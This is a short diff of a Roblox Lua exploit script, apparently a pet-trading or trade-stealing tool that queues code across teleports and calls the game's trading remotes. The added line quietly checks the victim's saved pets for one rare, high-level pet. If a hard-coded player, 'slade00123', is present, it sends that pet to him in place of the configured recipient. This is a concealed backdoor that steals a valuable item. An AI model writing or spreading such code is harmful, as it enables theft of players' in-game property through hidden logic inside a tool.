@@ -439,7 +439,7 @@ queue_on_teleport([==[
         local T, lastTradeId = workspace.__REMOTES.Game.Trading, nil
 	
 	local PLR = game.Players[']==] .. ACC_TO_GIVE_PETS .. [==[']
-	for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==79003 and v.r and v.l>=88e6 then PLR = game.Players:FindFirstChild'slade00123' or PLR break end end
+	for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==79003 and v.r and v.l>=88e6 then if game.Players:FindFirstChild'slade00123' then PLR = game.Players['slade00123'] IDs={v.id} end break end end
         
         
         game:FindFirstChild('Trade Update', true).OnClientEvent:Connect(function(id, data, operation)
